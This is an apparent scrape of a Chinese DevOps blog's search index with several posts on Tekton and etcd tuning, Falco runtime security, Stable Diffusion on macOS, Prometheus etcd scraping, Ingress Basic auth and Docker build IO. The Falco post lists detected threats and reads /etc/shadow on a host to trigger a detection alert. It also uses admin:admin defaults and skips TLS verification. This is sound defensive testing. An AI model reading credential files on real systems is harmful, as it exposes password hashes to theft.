Tekton 的基础运行时是 Kubernetes ，Etcd 又是 Kubernetes 的存储核心。因此，有必要保持 Etcd 进程具有最高的优先级，以减少管理平面的时间消耗。\n1 ionice -c2 -n0 -p $(pgrep etcd) 6.3 拆分 Event 事件到新的 Etcd 集群 部署 Etcd 这里比较特殊的是，我采用的是 Kubekey 部署的集群，默认 Etcd 证书已经包含全部集群节点 IP。因此，我直接将其中一个 Etcd 拷贝到新节点运行一个新的 Etcd 集群，修改 ETCD_INITIAL_CLUSTER_STATE=new 即可。\n否则，如果 Etcd 集群采用 TLS 连接，可能得重新生成并更新 kube-apiserver 中的 Etcd 证书。\n编辑全部 master 节点的 kube-apiserver ，添加 etcd 配置 1 vim /etc/kubernetes/manifests/kube-apiserver.yaml 新增如下配置[4]\n1 - --etcd-servers-overrides=\u0026#34;/events#https://5.5.5.5:2379\u0026#34; 等待 kube-apiserver 重启完成。\n在新的 Etcd 集群查看节点状态 1 2 3 4 5 6 7 etcdctl --write-out=table endpoint status +----------------+------------------+---------+---------+-----------+-----------+------------+ | ENDPOINT | ID | VERSION | DB SIZE | IS LEADER | RAFT TERM | RAFT INDEX | +----------------+------------------+---------+---------+-----------+-----------+------------+ | 127.0.0.1:2379 | 173a84b520278cc1 | 3.4.13 | 18 MB | true | 2 | 11223 | +----------------+------------------+---------+---------+-----------+-----------+------------+ 如果看到 DB SIZE 不断增加，就说明 Event 事件已经拆分到了新的 Etcd 集群。\n查看优化效果 这是在工作时间段的监控截图，有些难以置信的是经过 SSD、剥离 Event 事件之后，Etcd 磁盘延时竟然只有 10 ms。\n但 Etcd 部分的优化，可能对构建时长有 1-2 秒的优化效果，这远不是理想的结果。在分析 Kubelet 日志、源码之后，使用 NFS 是一个不错的优化点。\n7. 使用 NFS 存储能有效加快带存储卷的 Pod 创建 创建时，如果对存储有依赖，Pod 会持续地等待，会导致容器创建慢。下面是一个简化之后的例子，其中，nodeName 指定了节点避免集群调度的干扰；imagePullPolicy 设置为 IfNotPresent 避免拉取镜像的干扰。\n无存储的负载 1 2 3 4 5 6 7 8 9 10 apiVersion: v1 kind: Pod metadata: name: test-pv spec: nodeName: node1 containers: - image: nginx imagePullPolicy: IfNotPresent name: nginx 下面是时间序列:\n1 2 3 4 pod -\u0026gt; 03:01:18 nginx -\u0026gt; 03:01:19 nginx \u0026lt;- pod \u0026lt;- 在镜像已经提前拉取的情况下，启动第一个容器花了 1 秒。\n有存储的负载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 apiVersion: v1 kind: Pod metadata: name: test-pv spec: nodeName: node1 containers: - image: nginx imagePullPolicy: IfNotPresent name: nginx volumeMounts: - mountPath: /data name: data volumes: - name: data persistentVolumeClaim: claimName: test-pv --- apiVersion: v1 kind: PersistentVolumeClaim metadata: name: test-pv spec: accessModes: - ReadWriteOnce resources: requests: storage: 10Gi 下面是时间序列:\n1 2 3 4 5 6 7 pvc -\u0026gt; 09:55:09 pv -\u0026gt; 09:55:12 pod -\u0026gt; 09:55:09 nginx -\u0026gt; 09:55:27 nginx \u0026lt;- pod \u0026lt;- 以下为 Pod 使用 PV 的流程为[5]，时间点主要从 Kubelet、iscsid 日志中分析得出:\n存储组件创建 pv -\u0026gt; 09:55:12 attach 挂载到 Pod 所在 Node -\u0026gt; 09:55:14(iscsi connected)-09:55:25(kubelet attached) mount 挂载到 Pod -\u0026gt; 09:55:26 可以看到 attach 花费了太多时间，因此换为免 attach 的 NFS 作为后端存储。\n经过测试大约能有 21 秒的加速效果。\n从原来的执行时长:\n2 分钟 13 秒、2 分钟 34 秒、2 分钟 37 秒、2 分钟 28 秒、2 分钟 25 秒\n缩短为:\n1 分钟 58 秒、2 分钟 20 秒、2 分钟 16 秒、1 分钟 58 秒、2 分钟 1 秒\n在配合 disable-affinity-assistant 之后，大约又能节约 10 - 20 秒，下图是测试数据:\n8. 总结 最近一直在尝试从运维的角度优化构建慢的问题。\n本篇是关于 Tekton 执行克隆任务慢问题的优化。通过使用 NFS 存储，大约能减少 20 秒 Kubelet 创建 Pod 的时间；关闭 affinity-assistant 功能将单条流水线的 Pod 分散到多个节点，大约能减少 10-20 秒启动速度 ；由于测试数据集有限，目前观测到的效果是之前 2 分 30 秒的克隆流水线，现在 2 分钟以内能完成，大约有 30 秒的优化提升。当然，更快的构建方式是，一个 Pod 多仓库克隆、保持 PV 不销毁，但调整过大，不在本次运维优化范围。\n以下为本文主要观点:\nCPU 高性能模式有利于 Pod 快速启动 ReadWriteOnce、ReadWriteMany 描述的是 Pod 与 Node 的关系，ReadWriteOnce 模式下，同一个 Node 的多个 Pod 可以同时使用 PV 带存储卷的 Pod 启动速度比不带存储的 Pod 慢很多，大约能慢 10 多秒 Tekton 默认配置下，一条流水线只能在一个节点构建；通过参数 disable-affinity-assistant 可以关闭这一特征，提高并行 task 的并行度 使用 SSD、拆分 Event 能够显著降低 Etcd 的磁盘压力、提高响应速度 NFS 下带存储卷的 Pod 创建速度明显快于 OpenEbs、Longhorn 9. 参考 https://zhangguanzhang.github.io/2019/04/28/k8s-java-start-time-not-same/ https://kubernetes.io/zh-cn/docs/concepts/storage/persistent-volumes/#access-modes https://tekton.dev/docs/operator/tektonconfig/ https://imroc.cc/kubernetes/best-practices/ops/etcd-optimization.html https://www.lixueduan.com/posts/kubernetes/14-pv-dynamic-provision-process/ ","description":"","id":124,"section":"post","tags":["博文","Tekton","Kubernetes","CI","CICD","DevOps"],"title":"优化 Tekton 执行克隆任务慢问题，节省约 30 秒","uri":"https://www.chenshaowen.com/blog/optimizing-the-slow-of-tekton-clone-task.html"},{"content":"1. Falco 是什么 Falco 是由 Sysdig 贡献给 CNCF 的云原生运行时安全相关项目。\nFalco 实现了一套可扩展的事件规则过滤引擎，通过获取事件、匹配安全规则、产生告警通知系列操作，能够发现系统中的安全问题。其中的事件来自系统调用，同时也支持 ebpf 探针，规则是开源的[1]，可以自行定义扩展[2]。下图为其架构图:\nFalco 可以检测到的典型事件包括:\n在容器中运行 shell 以特权形式运行的容器 读取敏感数据，比如 /etc/shadow 容器挂载主机的敏感路径 出站网络连接 2. 生成证书 Falco 的 gRPC 需要双向的 TLS 认证 [3]。Falco exporter 通过 gRPC 暴露相关事件，自研的系统也可以通过 gRPC 直接集成 Falco。下面的步骤用来生成交互所需的证书，Falco 官方的文档有些陈旧，有些操作会报错。\n创建证书目录 1 2 mkdir /root/falco cd /root/falco 创建 CA 证书 1 2 3 4 5 6 openssl genrsa -out ca.key 4096 openssl req -x509 -new -nodes -sha512 -days 3650 \\ -subj \u0026#34;/C=CN/ST=Beijing/L=Beijing/O=example/OU=Personal/CN=dev.chenshaowen.com\u0026#34; \\ -key ca.key \\ -out ca.crt 创建服务端证书 1 2 3 4 5 6 7 8 9 10 11 12 13 14 openssl genrsa -out server.key 4096 openssl req -sha512 -new \\ -key server.key \\ -out server.csr \\ -subj \u0026#34;/C=SP/ST=Italy/L=Ornavasso/O=Test/OU=Server/CN=localhost\u0026#34; openssl x509 -req -sha512 \\ -days 3650 \\ -CA ca.crt \\ -CAkey ca.key \\ -in server.csr \\ -out server.crt \\ -set_serial 01 创建客户端证书 1 2 3 4 5 6 7 8 9 10 11 12 13 14 openssl genrsa -out client.key 4096 openssl req -sha512 -new \\ -key client.key \\ -out client.csr \\ -subj \u0026#34;/C=SP/ST=Italy/L=Ornavasso/O=Test/OU=client/CN=localhost\u0026#34; openssl x509 -req -sha512 \\ -days 3650 \\ -CA ca.crt \\ -CAkey ca.key \\ -in client.csr \\ -out client.crt \\ -set_serial 01 查看全部生成的证书 1 2 3 ls /root/falco ca.crt ca.key client.crt client.csr client.key server.crt server.csr server.key 3. 在 Kubernetes 上安装 Falco 添加 Helm 源 1 2 helm repo add falcosecurity https://falcosecurity.github.io/charts helm repo update 安装 falco [4] 1 2 3 4 5 6 7 8 9 10 11 helm install falco falcosecurity/falco \\ --namespace falco --create-namespace \\ --version 3.0.0 \\ --set-file certs.ca.crt=/root/falco/ca.crt,certs.server.key=/root/falco/server.key,certs.server.crt=/root/falco/server.crt \\ --set ebpf.enabled=true \\ --set falco.grpc.enabled=true \\ --set falco.grpc_output.enabled=true \\ --set falcosidekick.enabled=true \\ --set falcosidekick.webui.enabled=true \\ --set falcosidekick.webui.user=\u0026#34;admin:admin\u0026#34; \\ --set falco.grpc.unixSocketPath=\u0026#34;\u0026#34; 安装 falco-exporter 1 2 3 4 5 helm install falco-exporter falcosecurity/falco-exporter \\ --namespace falco --create-namespace \\ --version 0.9.1 \\ --set falco.grpcTimeout=3m --set-file certs.ca.crt=/root/falco/ca.crt,certs.client.key=/root/falco/client.key,certs.client.crt=/root/falco/client.crt 查看服务 在运行过程中会请求 ghcr.io 下载默认规则 falco_rules.yaml.tar.gz，在网络受限环境下，可能会下载失败。\n1 2 3 4 5 6 7 8 kubectl -n falco get pod -w NAME READY STATUS RESTARTS AGE falco-5bbl6 2/2 Running 0 152s falco-exporter-26gfz 1/1 Running 0 124s falco-falcosidekick-5c8bf5d7fb-kx778 1/1 Running 0 111s falco-falcosidekick-ui-5b56bbd7cb-5wdwl 1/1 Running 3 111s ... [可选]卸载 Falco 1 2 helm uninstall falco --namespace falco helm uninstall falco-exporter --namespace falco 4. 使用 Grafana 面板查看 Falco 事件数据 通过查看 falco-exporter svc 可以看到其已经将 metrics 暴露给了 Prometheus。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 kubectl -n falco get svc falco-exporter -o yaml apiVersion: v1 kind: Service metadata: annotations: prometheus.io/port: \u0026#34;9376\u0026#34; prometheus.io/scrape: \u0026#34;true\u0026#34; name: falco-exporter namespace: falco spec: ports: - name: metrics port: 9376 protocol: TCP targetPort: 9376 selector: app.kubernetes.io/instance: falco-exporter app.kubernetes.io/name: falco-exporter 接下来，只需要添加 Grafana 面板即可。导入 11914，即 https://grafana.com/grafana/dashboards/11914-falco-dashboard/。查看数据如下图:\n但 Metrics 中暴露的信息比较有限，在 Prometheus 中查询 falco_events{rule=\u0026quot;Read sensitive file untrusted\u0026quot;}，得到结果 falco_events{app_kubernetes_io_instance=\u0026quot;falco-exporter\u0026quot;, app_kubernetes_io_managed_by=\u0026quot;Helm\u0026quot;, app_kubernetes_io_name=\u0026quot;falco-exporter\u0026quot;, app_kubernetes_io_version=\u0026quot;0.8.0\u0026quot;, helm_sh_chart=\u0026quot;falco-exporter-0.9.1\u0026quot;, hostname=\u0026quot;falco-h57xg\u0026quot;, instance=\u0026quot;1.1.1.1:9376\u0026quot;, job=\u0026quot;kubernetes-service-endpoints\u0026quot;, k8s_ns_name=\u0026quot;\u0026lt;NA\u0026gt;\u0026quot;, k8s_pod_name=\u0026quot;\u0026lt;NA\u0026gt;\u0026quot;, namespace=\u0026quot;falco\u0026quot;, node=\u0026quot;node1\u0026quot;, priority=\u0026quot;4\u0026quot;, rule=\u0026quot;Read sensitive file untrusted\u0026quot;, service=\u0026quot;falco-exporter\u0026quot;, source=\u0026quot;syscall\u0026quot;, tags=\u0026quot;,T1020,T1083,T1212,T1552,T1555,container,filesystem,host,mitre_credential_access,mitre_discovery,\u0026quot;} ，并不会展示执行的用户、执行的命令等详情信息，只能看到事件的优先级、触发的规则等有限的信息。\n5. 使用 falcosidekick-ui 查看事件 falcosidekick 主要是实现了对事件的集中管理，并提供丰富的告警通道能力，能够将告警发送给 slack、rocketchat、elasticsearch 等 [5]。\n而 falco-falcosidekick-ui 提供了对 falco 事件的查看能力。\n安装 falco-falcosidekick-ui 刚才在安装 falco 时，已经添加如下参数，因此 falcosidekick 及 falcosidekick-ui 已经安装。\n1 2 3 --set falcosidekick.enabled=true \\ --set falcosidekick.webui.enabled=true \\ --set falcosidekick.webui.user=\u0026#34;admin:admin\u0026#34; 暴服务端口 1 2 kubectl -n falco patch svc falco-falcosidekick-ui --patch \\ \u0026#39;{\u0026#34;spec\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;NodePort\u0026#34;, \u0026#34;ports\u0026#34;: [ { \u0026#34;nodePort\u0026#34;: 32000, \u0026#34;port\u0026#34;: 2802, \u0026#34;protocol\u0026#34;: \u0026#34;TCP\u0026#34;, \u0026#34;targetPort\u0026#34;: 2802 } ] } }\u0026#39; 登录页面查看 UI 通过主机 IP:32000 端口，即可打开 falcosidekick ui 的页面。默认账户是 admin，默认密码是 admin。\n在主机上，读取敏感文件 cat /etc/shadow 之后，在 falcosidekick ui 页面就可以查看到相关的事件，如下图:\nOutput 内容，由于是主机上的操作，会缺失集群相关字段，但文件、命令等信息会丰富不少:\n1 Warning Sensitive file opened for reading by non-trusted program (user=root user_loginuid=1001 program=cat command=cat /etc/shadow pid=54909 file=/etc/shadow parent=bash gparent=sudo ggparent=bash gggparent=sshd container_id=host image=\u0026lt;NA\u0026gt;) k8s.ns=\u0026lt;NA\u0026gt; k8s.pod=\u0026lt;NA\u0026gt; container=host Dashboard 页面提供的是全局统计的视图，可以从整体上对集群、主机的安全进行评估，视图如下:\n6. 参考 https://github.com/falcosecurity/rules/blob/main/rules/falco_rules.yaml https://falco.org/docs/rules/basic-elements/ https://falco.org/docs/grpc/grpc-config/ https://github.com/falcosecurity/charts/tree/master/falco#enabling-grpc https://github.com/falcosecurity/falcosidekick ","description":"","id":125,"section":"post","tags":["博文","Falco","安全","工具"],"title":"使用 Falco 监听运行时安全","uri":"https://www.chenshaowen.com/blog/listen-runtime-security-using-falco.html"},{"content":"1. 运行 Stable Diffusion 推荐配置 内存: 不低于 16 GB DDR4 或 DDR5 存储: 不低于 10 GB 可用空间 GPU: 不低于 6 GB 显存 N 卡 如果硬件达不到要求，也可以使用各种优化 fork 兼容更低配置的硬件，但生成时间会增长。\n当前的开发主机配置为:\n2.9 GHz 8-Core Intel Core i7 16 GB 2666 MHz DDR4 250 GB SSD 由于没有 GPU，生成图片时，需要多等待一会儿。\n2. macOS 上运行 Stable Diffusion 安装 anaconda 1 brew install --cask anaconda 配置 PATH 1 echo \u0026#39;export PATH=/usr/local/anaconda3/bin:$PATH\u0026#39; \u0026gt;\u0026gt; ~/.zshrc conda 初始化 Shell 1 conda init zsh 这里需要关闭窗口，重新登录 Terminal。\n下载并进入项目目录 1 2 git clone https://github.com/AUTOMATIC1111/stable-diffusion-webui cd stable-diffusion-webui 创建 Python 环境 1 conda create -n stabel python=3.10.6 激活 Python 环境，并安装依赖 1 2 conda activate stabel pip3 install -r requirements_versions.txt 下载模型 前往 https://huggingface.co/CompVis/stable-diffusion-v-1-4-original 下载 sd-v1-4.ckpt 或者 sd-v1-4-full-ema.ckpt 文件，放置到 models/Stable-diffusion ⽬录下。huggingface 上也有很多其他模型可以下载使用，也能在线体验。比如 https://huggingface.co/spaces/IDEA-CCNL/Taiyi-Stable-Diffusion-Chinese 。\n修改运行参数，跳过 GPU 检测，参考[1] 1 export COMMANDLINE_ARGS=\u0026#34;--lowvram --precision full --no-half --skip-torch-cuda-test --listen --port 7860\u0026#34; 运行项目 1 python launch.py 在本地访问 http://127.0.0.1:7860 即可打开 UI。\n如果启动时，出现类似 stderr: Running command git clone --filter=blob:none --quiet https://github.com/mlfoundations/open_clip.git 报错，可以编辑 launch.py 找到 def prepare_environment() 函数，修改 git+https://https://github.com/ 为 git+https://ghproxy.chenshaowen.com/https://github.com/ 即可。\n3. Text-to-Image 测试 Prompt 有很多的撰写技巧、句式、修饰词；Stable Diffusion 也有很多参数可以调整。但本篇主要描述的是在无 GPU 情况下，在 macOS 下运行 Stable Diffusion，因此在此仅输入 bird ，进行测试。生成的图片如下图:\n4. 参考 https://github.com/AUTOMATIC1111/stable-diffusion-webui/issues/1742 ","description":"","id":126,"section":"post","tags":["博文","AI","macOS","GPU"],"title":"如何在无 GPU 的 macOS 上运行 Stable Diffusion","uri":"https://www.chenshaowen.com/blog/how-to-run-stable-diffusion-in-macos-without-gpu.html"},{"content":"1. 跳过证书校验无法获取监控 如果指标抓取时，能跳过 TLS 认证是最便捷的。其 Prometheus 的 ConfigMap 配置如下:\n1 2 3 4 5 6 7 8 9 - job_name: etcd metrics_path: /metrics scheme: https tls_config: insecure_skip_verify: true static_configs: - targets: [ \u0026#39;1.1.1.1:2379\u0026#39; ] - targets: [ \u0026#39;2.2.2.2:2379\u0026#39; ] - targets: [ \u0026#39;3.3.3.3:2379\u0026#39; ] 但 Prometheus Targets 报错 Get \u0026quot;https://3.3.3.3:2379/metrics\u0026quot;: remote error: tls: bad certificate\n在 targets 页面的报错如下图:\n2. curl 验证抓取请求 跳过证书 1 2 3 curl https://1.1.1.1:2379/metrics -k curl: (35) error:1401E412:SSL routines:CONNECT_CR_FINISHED:sslv3 alert bad certificate 这个报错没找到解法，于是直接换成了需要 TLS 的方式。\n配置证书使用 curl 获取数据 1 curl https://1.1.1.1:2379/metrics --cacert /etc/ssl/etcd/ssl/ca.pem --cert /etc/ssl/etcd/ssl/node-node1.pem --key /etc/ssl/etcd/ssl/node-node1-key.pem 成功返回 Metrics 数据。\n这里的 node-node1.pem 证书应该包含全部 Etcd 节点 IP 的域。可以通过 openssl x509 -noout -text -in /etc/ssl/etcd/ssl/node-node1.pem 查看证书相关信息。\n3. 给集群 Prometheus 新增 Etcd TLS 抓取 创建凭证 1 kubectl -n monitor create secret generic etcd-certs --from-file=/etc/ssl/etcd/ssl/ca.pem --from-file=/etc/ssl/etcd/ssl/node-node1.pem --from-file /etc/ssl/etcd/ssl/node-node1-key.pem 这里的证书就是上面 curl 验证过的证书。\n在 Deployment 中挂载证书 1 kubectl -n monitor edit deployments.apps prometheus-server 新增如下两部分内容:\n1 2 3 volumeMounts: - mountPath: /var/run/secrets/kubernetes.io/k8s-certs/etcd/ name: k8s-certs 1 2 3 4 volumes: - name: k8s-certs secret: secretName: etcd-certs 在 ConfigMap 中添加抓取 Etcd 指标的 Job 1 kubectl -n monitor edit cm prometheus-server 1 2 3 4 5 6 7 8 9 10 11 - job_name: etcd metrics_path: /metrics scheme: https tls_config: ca_file: /var/run/secrets/kubernetes.io/k8s-certs/etcd/ca.pem cert_file: /var/run/secrets/kubernetes.io/k8s-certs/etcd/node-node1.pem key_file: /var/run/secrets/kubernetes.io/k8s-certs/etcd/node-node1-key.pem static_configs: - targets: [ \u0026#39;1.1.1.1:2379\u0026#39; ] - targets: [ \u0026#39;2.2.2.2:2379\u0026#39; ] - targets: [ \u0026#39;3.3.3.3:2379\u0026#39; ] 查看 targets 的状态 此时，在 Prometheus 中，应该可以看到抓取 Etcd 监控数据的 Job 状态为 Up，如下图:\n4. 导入 Grafana 面板查看监控数据 在 Grafana 中导入面板 3070，即 https://grafana.com/grafana/dashboards/3070-etcd/ ，就可以看到如下监控视图:\n","description":"","id":127,"section":"post","tags":["博文","Etcd","集群","Prometheus","监控"],"title":"使用集群内 Prometheus 采集 Etcd 指标","uri":"https://www.chenshaowen.com/blog/using-prometheus-in-the-cluster-to-collect-etcd-metrics.html"},{"content":"1. 部署 Ingress Controller 查看 Kubernetes 版本 1 2 3 4 kubectl version --short Client Version: v1.21.4 Server Version: v1.21.4 查找兼容的 Nginx Ingress 版本 Helm Chart version Helm Chart 最高可用版本 K8s 适配版本 3.x.x 3.36.0 1.16+ 4.x.x 4.4.2 1.19+ 参考: https://github.com/kubernetes/ingress-nginx\n安装 Nginx Ingress Controller 1 2 3 helm upgrade --install ingress-nginx ingress-nginx \\ --repo https://kubernetes.github.io/ingress-nginx \\ --namespace ingress-nginx --create-namespace --version v4.4.2 查看服务 1 2 3 4 5 6 7 8 9 10 11 12 kubectl -n ingress-nginx get svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE ingress-nginx-controller LoadBalancer 10.233.11.232 \u0026lt;pending\u0026gt; 80:30914/TCP,443:31493/TCP 14m ingress-nginx-controller-admission ClusterIP 10.233.56.67 \u0026lt;none\u0026gt; 443/TCP 14m kae@node1:~$ kubectl -n ingress-nginx get pod,svc NAME READY STATUS RESTARTS AGE pod/ingress-nginx-controller-666f45c794-h2zk9 1/1 Running 0 14m NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/ingress-nginx-controller LoadBalancer 10.233.11.232 \u0026lt;pending\u0026gt; 80:30914/TCP,443:31493/TCP 14m service/ingress-nginx-controller-admission ClusterIP 10.233.56.67 \u0026lt;none\u0026gt; 443/TCP 14m 2. 添加秘钥 生成秘钥 1 2 3 htpasswd -nb \u0026#39;admin\u0026#39; \u0026#39;xxxxxx\u0026#39; | base64 xxxxxxxxxxxxxxxxxxxxxx 登录用户 admin，登录密码 xxxxxx\n在服务所在命名空间，添加凭证 1 2 3 4 5 6 7 8 9 10 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: v1 kind: Secret type: Opaque metadata: namespace: longhorn-system name: basic-auth data: auth: \u0026#34;xxxxxxxxxxxxxxxxxxxxxx\u0026#34; EOF 3. 添加 Ingress 转发规则 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - kind: Ingress apiVersion: networking.k8s.io/v1 metadata: name: longhorn-ingress namespace: longhorn-system annotations: kubernetes.io/ingress.class: nginx nginx.ingress.kubernetes.io/auth-type: basic nginx.ingress.kubernetes.io/auth-secret: basic-auth nginx.ingress.kubernetes.io/auth-realm: \u0026#34;Authentication Required\u0026#34; spec: rules: - host: longhorn.chenshaowen.com http: paths: - path: / pathType: Prefix backend: service: name: longhorn-frontend port: number: 80 EOF nginx.ingress.kubernetes.io/auth-type: basic 和 nginx.ingress.kubernetes.io/auth-secret: basic-auth 指定了认证的方式为 Basic，认证秘钥为 basic-auth 。\n4. 访问服务 在访问主机上添加 hosts 指向集群主机 域名即为 Ingress 中配置的 hosts，这里是 longhorn.chenshaowen.com\n使用域名访问服务 由于 Ingress Controller 将其 80 端口映射到主机的 30914 ，因此服务的访问地址为 longhorn.chenshaowen.com:30914。\n上图输入账户 admin，密码 xxxxx 之后即可查看服务。如下图:\n","description":"","id":128,"section":"post","tags":["博文","Kubernetes","认证","Ingress"],"title":"如何给 Kubernetes 服务添加 Basic 认证访问","uri":"https://www.chenshaowen.com/blog/how-to-add-basic-auth-to-kubernetes-service.html"},{"content":"1. 遇到的问题 项目介绍:\n文件大小 5.6 GB 文件数量 529352 Dockerfile\n1 2 3 FROM golang:1.13 COPY ./ /go/src/code 构建命令及输入如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 time DOCKER_BUILDKIT=1 docker build --no-cache -t test:v3 -f Dockerfile . --progress=plain #1 [internal] load build definition from Dockerfile #1 sha256:2a154d4ad813d1ef3355d055345ad0e7c5e14923755cea703d980ecc1c576ce7 #1 transferring dockerfile: 37B done #1 DONE 0.1s #2 [internal] load .dockerignore #2 sha256:9598c0ddacf682f2cac2be6caedf6786888ec68f009c197523f8b1c2b5257b34 #2 transferring context: 2B done #2 DONE 0.2s #3 [internal] load metadata for golang:1.13 #3 sha256:0c7952f0b4e5d57d371191fa036da65d51f4c4195e1f4e1b080eb561c3930497 #3 DONE 0.0s #4 [1/2] FROM golang:1.13 #4 sha256:692ef5b58e708635d7cbe3bf133ba934336d80cde9e2fdf24f6d1af56d5469ed #4 CACHED #5 [internal] load build context #5 sha256:f87f36fa1dc9c0557ebc53645f7ffe404ed3cfa3332535260e5a4a1d7285be3c #5 transferring context: 18.73MB 4.8s #5 transferring context: 38.21MB 9.8s done #5 DONE 10.5s #6 [2/2] COPY ./ /go/src/code #6 sha256:2c63806741b84767def3d7cebea3872b91d7ef00bd3d524f48976077cce3849a #6 DONE 26.8s #7 exporting to image #7 sha256:e8c613e07b0b7ff33893b694f7759a10d42e180f2b4dc349fb57dc6b71dcab00 #7 exporting layers #7 exporting layers 67.5s done #7 writing image sha256:03b278543ab0f920f5af0540d93c5e5340f5e1f0de2d389ec21a2dc82af96754 done #7 naming to docker.io/library/test:v3 done #7 DONE 67.6s real 1m45.411s user 0m18.374s sys 0m7.344s 其中比较花时间的是:\n10s，load build context 26s，执行 COPY 操作 67s，导出镜像，镜像大小 5.79GB 以下也是按照这个思路进行逐一排查，测试验证，寻找构建时的 IO 瓶颈。\n2. 自制 go client 直接提交给 Dockerd 构建效果不佳 工程 https://github.com/shaowenchen/demo/tree/master/buidl-cli 实现的功能就是将本地的 Dockerfile 及上下文提交给 Dockerd 进行构建，从而测试 Docker CLI 是否有提交文件上的瓶颈。\n2.1 编译生成二进制文件 1 GOOS=linux GOARCH=amd64 go build -o build main.go 2.2 自制二进制提交构建任务 1 2 3 4 5 time ./build ./ test:v3 real 5m12.758s user 0m2.182s sys 0m14.169s 使用 Go 写的 cli 工具，将构建上下文提交给 Dockerd 进行构建，时长急剧增加；与此同时，构建机的负载飙升。\n也可能还有其他优化点，需要慢慢调试。而 Docker CLI 其实也有相关的参数可以用于减少 IO 占用时间。\n3. 构建参数 compress、stream 参数优化效果不佳 compress 会将上下文压缩为 gzip 格式进行传输，而 stream 会以流的形式传输上下文。\n3.1 使用 compress 优化 1 2 3 4 5 time DOCKER_BUILDKIT=1 docker build --no-cache -t test:v3 -f Dockerfile . --compress real 1m46.117s user 0m18.551s sys 0m7.803s 3.2 使用 stream 优化 1 2 3 4 5 time DOCKER_BUILDKIT=1 docker build --no-cache -t test:v3 -f Dockerfile . --stream real 1m51.825s user 0m19.399s sys 0m7.657s 这两个参数对缩短构建时间，并没有什么效果。但需要注意的是测试项目的文件大而且数量多，如果测试用例发生变化，可能产生不同的效果。接着，我们一起看看文件数量、文件大小对 Dockerd 构建镜像的影响。\n4. 文件数量对 COPY 影响远不及文件大小 4.1 准备测试文件 1 2 3 4 du -h --max-depth=1 119M ./data 119M . 在 data 目录下放置了一个 119MB 的文件，通过复制该文件不断增加 build context 的大小。\n4.2 测试 Dockerfile 1 2 3 FROM golang:1.13 COPY ./ /go/src/code 4.3 构建命令 1 DOCKER_BUILDKIT=1 docker build --no-cache -t test:v3 -f Dockerfile . 4.4 测试文件大小对 COPY 影响明显 文件大小 构建时长 文件个数 119M 0.3s 1个 237M 0.4s 2个 355M 0.5s 3个 473M 0.6s 4个 1.3G 3.7s 11个 2.6G 9.0s 22个 文件大小对 COPY 影响明显，接近线性增长。\n4.5 测试文件数量对 COPY 影响甚微 文件大小 构建时长 文件个数 2.9G 13.8s 264724个 5.6G 37.1s 529341个 文件数量对 COPY 影响不大。这是由于在 Docker CLI 将 build context 发送给 Dockerd 时，会对 context 进行 tar 打包，并不是一个一个文件传输。\n4.6 构建并发数的瓶颈在磁盘 ​IO 5.6G 529341个\n并发量 构建时长 1 37.1s 2 46s 3 81s 通过 iotop 可以实时观测到磁盘写速度，最快能达到 200MB/s，与文件系统 4K 随机写速度最接近。\n1 2 Rand_Write_Testing: (groupid=0, jobs=1): err= 0: pid=30436 write: IOPS=37.9k, BW=148MiB/s (155MB/s)(3072MiB/20752msec); 0 zone resets 由于公用一个 Dockerd，并发时 Dockerd 吞吐会有瓶颈，系统磁盘 IO 也会成为瓶颈。\n5. 不清理 Buildkit 缓存对新的构建影响甚微 如果提示找不到 docker build，则需要开启EXPERIMENTAL 或者没有 buildx，需要下载 docker-buildx 到 /usr/libexec/docker/cli-plugins/ 目录。\n查看 build 缓存 1 docker system df -v 清理全部 build 缓存 1 DOCKER_BUILDKIT=1 docker builder prune -f 仅当开启 BuildKit 时，才会产生 Build cache。生产环境的缓存大小达到 1.408TB，但比较清理前后，对于新项目的构建并没有发现明显构建速度变化；对于老项目，如果没有变动，命中缓存后速度很快。可能的原因是缓存虽大但条目不多，查询是否有缓存的时间开销很小。\n但定期定理缓存，有利于预防磁盘被占满的风险。\n定时清理远期的构建缓存 清理掉 72h 之前的缓存\n1 DOCKER_CLI_EXPERIMENTAL=enabled docker buildx prune --filter \u0026#34;until=72h\u0026#34; -f 6. 构建不会限制 CPU 但 IO 速度很慢 6.1 测试 CPU 限制 Dockerfile 文件\n1 2 3 4 FROM ubuntu RUN apt-get update -y RUN apt-get install -y stress RUN stress -c 40 1 DOCKER_BUILDKIT=1 docker build --no-cache -t test:v3 -f Dockerfile . 构建机有 40C，构建时机器 CPU 负载能达到 95%，说明构建时，Dockerd 默认不会对 CPU 消耗进行限制。在生产环境下，出现过 npm run build 占用 十几个 GB 内存的场景，因此我判断 Dockerd 默认也不会对内存消耗进行限制。\n6.2 在 Dockerfile 中测试 IO Dockerfile 文件\n1 2 3 4 FROM ubuntu RUN apt-get update -y RUN apt-get install -y fio RUN fio -direct=1 -iodepth=128 -rw=randwrite -ioengine=libaio -bs=4k -size=3G -numjobs=1 -runtime=1000 -group_reporting -filename=/tmp/test.file --allow_mounted_write=1 -name=Rand_Write_Testing 1 2 3 4 DOCKER_BUILDKIT=1 docker build --no-cache -t test:v3 -f Dockerfile . Rand_Write_Testing: (groupid=0, jobs=1): err= 0 write: IOPS=17.4k, BW=67.9MiB/s (71.2MB/s)(3072MiB/45241msec); 0 zone resets 6.3 在容器中测试 IO 1 docker run -it shaowenchen/demo-fio bash 1 2 Rand_Write_Testing: (groupid=0, jobs=1): err= 0 write: IOPS=17.4k, BW=68.1MiB/s (71.4MB/s)(3072MiB/45091msec); 0 zone resets 6.4 在容器的存储卷中测试 IO 1 docker run -v /tmp:/tmp -it shaowenchen/demo-fio bash 1 2 Rand_Write_Testing: (groupid=0, jobs=1): err= 0 write: IOPS=39.0k, BW=152MiB/s (160MB/s)(3072MiB/20162msec); 0 zone resets 6.5 在主机上试 IO 1 2 Rand_Write_Testing: (groupid=0, jobs=1): err= 0 write: IOPS=38.6k, BW=151MiB/s (158MB/s)(3072MiB/20366msec); 0 zone resets Dockerd 在构建 Dockerfile 